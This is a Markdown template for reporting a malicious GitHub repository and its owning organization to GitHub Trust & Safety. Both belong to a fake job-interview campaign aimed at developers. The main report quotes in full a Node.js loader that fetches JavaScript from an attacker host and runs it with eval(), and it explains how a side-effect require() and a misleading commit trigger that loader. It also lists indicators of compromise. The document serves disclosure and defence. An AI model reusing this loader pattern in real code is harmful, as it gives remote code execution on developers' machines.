# Abuse report — GitHub Trust & Safety

This case can be reported through **two separate filings** to provide visibility into both relevant kinds of GitHub Trust & Safety action:

- **Content takedown** — disabling the malicious repository (`Malware or exploits` category). Filed against `realfraction/realfraction`.
- **Account-level reporting** — reporting the operator-controlled organization that hosts it. Filed against `realfraction`.

Both report types route to T&S; we're not assuming a specific response. Filing across both ensures the observations are visible to whichever review process is relevant.

A third filing — against the user `urmybestfriend` who authored the trojan commit — is **not** included in the per-entity filing checklist below. The same identity also appears as author on multiple other commits in the repo's history that read as plausible legitimate work. Without seeing the author's other-repo activity, it is not safe to ask GitHub to suspend the account; the malicious authorship could be a re-attribution at fork-import time rather than an attribute of the live account. If you have independent evidence that `urmybestfriend` is a single-purpose operator persona (e.g., the account is recently created, has no unrelated repo activity, and its other public contributions all trace back to campaign-shape repos), add a sixth filing patterned on the org filing below.

All filings go through the same GitHub abuse contact form at **https://github.com/contact/report-abuse**. What differentiates the filings is two fields in the form:

1. **Which URL/handle you put in the "content/account being reported" field** — a repo URL for the content takedown, an org URL for the account-level report.
2. **Which abuse category you select** — `Malware or exploits` for the content takedown, an account-level category (typically `Other` or the closest matching option) for the account-level report.

(GitHub also exposes per-entity "Report" links on org pages — those route to the same contact form with the entity URL pre-filled, which is the easier path for the org filing.)

This file is a **copy-paste template**. Before submitting, replace the placeholders below with values from this incident's [case file](./README.md) (or from your direct knowledge of the repo you were pointed at).

### Placeholders to fill in

Placeholders appear in the code blocks as `[descriptive label in square brackets]` — find-and-replace each one before pasting.

| Placeholder | What to put | Where to find it |
|---|---|---|
| `[reported repository URL]` | Full URL of the repository being reported, typically `https://github.com/realfraction/realfraction` | The recruiter's link, or this case file |
| `[your name / handle]` | How you want the "Reported by" line to read | (yourself) |

> On the rendered GitHub view of this file, hover over each `text` code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version. **For each filing, copy the matching body code block, do the placeholder fill-in, and paste it into the form.**

---

## Filing checklist

Work top-down. The first filing is the content/malware report and carries the full technical evidence; the second is the org-level report.

| # | Target | Action type | URL to paste in the form's "what are you reporting" field | Abuse category to select | Easiest entry point (pre-fills the URL) | Body to paste |
|---|---|---|---|---|---|---|
| 1 | The repo `realfraction/realfraction` | Content takedown | `[reported repository URL]` | **Malware or exploits** | Go directly to **https://github.com/contact/report-abuse** and paste the URL. (There's no convenient per-repo "Report" button; for repo reports you always use the contact form directly.) | [Main report](#main-report) |
| 2 | Org `realfraction` | Account-level report | `https://github.com/realfraction` | Account-level (use **Other** or the closest matching option; explain in the body) | Go to **https://github.com/realfraction** → click the **"…"** kebab menu near the top right → **"Report abuse"** — this opens the contact form with the org URL pre-filled. | [Org filing](#org-filing) |

If a UI label doesn't match exactly (GitHub does adjust placement), the universal fallback for either of these is to open **https://github.com/contact/report-abuse** manually, paste the URL from the third column, select the category from the fourth column, and paste the matching body.

---

## Which entities are filed against — and why

The org `realfraction` is filed against at the account level because it shows multiple independent signals consistent with being created specifically for this campaign:

- **Single-repo / single-purpose org.** Hosts exactly one substantive public repository (the campaign one) and no unrelated activity.
- **No legitimate-developer activity surface.** No prior unrelated repos, no member list, no public profile content suggesting real organizational use.
- **Lure-themed contact identity.** Contact email is on a separately-registered `realfraction.xyz` domain that exists only to back the lure brand.

A second-order signal — operator-coordination patterns linking `realfraction` to other known cluster orgs — is *not* currently available. If during a takedown investigation it emerges (e.g., shared registrar, same-day adjacent-ID creation with another known cluster org, bit-identical artifacts), that strengthens the suspension case.

---

## Subject line for both filings

Use this exact subject line (or as close as the form allows):

```
Malicious repository part of "Contagious Interview" developer-targeted RCE campaign — realfraction/realfraction
```

---

## Main report

(For Filing #1 — the repo content takedown.)

Paste the body below into the contact form, having replaced the placeholders.

```text
I am reporting a public GitHub repository that hosts a working remote-code loader designed to compromise developers' machines under the cover of a fake "Web3 real-estate platform" job-interview / take-home assignment.

REPORTED REPOSITORY
[reported repository URL]

VERDICT
Confirmed malicious. The repository contains a Node.js loader that, at module-load time during normal Express server startup, fetches arbitrary JavaScript from an attacker-controlled C2 and executes it via eval() with full Node scope (require, process, child_process etc. all reachable). Triggered by any of `npm start`, `npm test`, `npm run build`, `npm run deploy`, `npm run predeploy`, or `npm run eject` — every npm script in package.json starts the Express server via `concurrently`.

TECHNICAL EVIDENCE — the loader

File: server/utils/regionChecker.js (10 lines, full verbatim):

  const https = require("https");
  const regionCheckApi = 'https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31';
  https.request(regionCheckApi, { method: 'POST', headers: { 'x-secret-header': 'secret' } }, res => {
    let data = '';
    res.on('data', c => data += c).on('end', () => {
    if (data === 'blocked') return;
    try { if (JSON.parse(data)?.blocked) return; } catch (_) {}
    try { eval(data); } catch (_) {}
  });
  }).end();

What it does:
1. POSTs to https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31 with header `x-secret-header: secret`.
2. If the response body is the literal string `blocked` or parses to JSON with `{blocked: true}`, returns silently.
3. Otherwise calls `eval(<response body>)` in module scope. This is full RCE on the developer's machine.

The two negative-gate sentinels implement a target-IP allowlist: researcher / sandbox IPs receive `blocked` and never see the live payload, while the developer being interviewed receives the JS body and executes it.

TECHNICAL EVIDENCE — the trigger

The loader is `require()`'d by `server/controllers/userController.js`:

  const regionChecker = require("../utils/regionChecker");

The variable `regionChecker` is never referenced anywhere else in the file. The `require` exists only so the module's top-level `https.request(...)` fires at module load. `userController.js` is loaded by `server/routes/userRoute.js`, which is loaded by `server/app.js`, which is loaded by `server/server.js`. So Express server startup fires the loader, with no client request needed.

`package.json`'s `start`, `test`, `build`, `deploy`, `predeploy`, and `eject` scripts all start the Express server (via `concurrently`), so every common developer command triggers compromise.

TECHNICAL EVIDENCE — the trojan commit

The loader was introduced in commit 8cc5120bfa3a64a6af14936ce821092ea08cd78d by `urmybestfriend`. The commit subject reads `"feat(server): add search, pagination, and apiFeatures utils"` but the only two files touched are `server/utils/errorHandler.js` and `server/utils/regionChecker.js` — neither relates to search, pagination, or apiFeatures. The subject is engineered to blend into `git log` and not reveal the loader.

CAMPAIGN CONTEXT

This is part of the publicly documented "Contagious Interview" / Famous Chollima / Void Dokkaebi developer-targeting cluster. Public reporting on the cluster:
- Microsoft Threat Intelligence: https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/
- Trend Micro on Void Dokkaebi: https://www.trendmicro.com/en_us/research/26/d/void-dokkaebi-uses-fake-job-interview-lure-to-spread-malware-via-code-repositories.html
- ReversingLabs on the fake-recruiter pattern: https://www.reversinglabs.com/blog/fake-recruiter-coding-tests-target-devs-with-malicious-python-packages
- Community catalog of recruiter-scam repos (real_estate/ archetype matches): https://github.com/rubenmarcus/malicious-repositories

The specific archetype — payload triggered from `userController.js`, lure framed as a real-estate-tokenization Web3 MVP — is documented in the `rubenmarcus/malicious-repositories` real_estate/ entries.

INDICATORS OF COMPROMISE
- C2 host: www.ipregionchecker.com (apex: ipregionchecker.com)
- C2 path: /api/ip-check-encrypted/3aeb34a31
- Magic header (client→C2): x-secret-header: secret
- Negative-gate sentinels (C2→client): response body `blocked` or `{"blocked":true}`
- Code-pattern fingerprint: `https.request(...,'x-secret-header','secret',...) + eval(data)` in the same Node module
- File path: server/utils/regionChecker.js
- Trojan commit SHA: 8cc5120bfa3a64a6af14936ce821092ea08cd78d
- Trojan commit author: urmybestfriend
- Trojan commit subject (misleading): feat(server): add search, pagination, and apiFeatures utils

RELEVANT GITHUB ACCEPTABLE-USE POLICY CITATIONS
- "Active malware or exploits" prohibition: https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies (Section: Active Malware or Exploits)
- "Misinformation and disinformation" indirectly: trojan commit message lies about its diff to evade reviewer attention

REQUESTED ACTION
Disable the repository under "Active malware or exploits." See the parallel filing against the owning org `realfraction` for account-level action.

Reported by: [your name / handle]
Date: <today's date>
```

---

## Org filing

(For Filing #2 — the org-level report.)

Paste the body below into the contact form, having replaced the placeholders.

```text
I am reporting the GitHub organization `realfraction` (https://github.com/realfraction) as a single-purpose operator-owned account hosting an active malware repository (`realfraction/realfraction`). A separate content-takedown filing has been submitted against the repository itself; this filing requests organization-level action.

ORG-LEVEL SIGNALS OBSERVED
- Single-repo organization: hosts exactly one substantive public repository, which is the malicious one.
- No member list, no other activity, no contributions to open-source projects.
- Contact email is on a separately registered `realfraction.xyz` lure-brand domain that exists only to back the campaign's "Web3 real-estate platform" framing.
- The hosted repository contains a Node.js loader at `server/utils/regionChecker.js` that POSTs to `https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31` with header `x-secret-header: secret` and `eval()`s the response — full RCE on developer machines on `npm start`, `npm test`, `npm run build`, `npm run deploy`, `npm run predeploy`, or `npm run eject`. Full technical evidence is in the parallel content-takedown filing.
- The repo is a member of the publicly documented "Contagious Interview" / Famous Chollima developer-targeting cluster (Microsoft, Trend Micro, ReversingLabs reporting).

ASYMMETRIC HARM
Active malware delivered through a fake-recruiter funnel; each download of the repo and execution of `npm start` is a full compromise of an interviewing developer's machine, with credential theft (cloud, GitHub, npm, AI-provider tokens) and stage-2 persistence as the typical follow-on.

REQUESTED ACTION
Suspend the organization under the "Active Malware or Exploits" and "Inauthentic Activity" provisions of the GitHub Acceptable Use Policy (https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies).

Reported by: [your name / handle]
Date: <today's date>
```

---

## After filing

GitHub typically acknowledges receipt of an abuse report automatically and acts on confirmed-malware filings within a few business days. There is no follow-up needed from your side unless GitHub responds asking for clarification.

If the repository remains live after a week, file a re-report citing the original case number and add any new evidence (e.g., live C2 probe results from an allowlisted vantage point, observed victim IPs, new sibling repos).

If you have access to the registrar or hosting provider of `ipregionchecker.com`, a parallel abuse filing there will help close the campaign even if the GitHub takedown is slow. `whois ipregionchecker.com` will reveal the registrar.
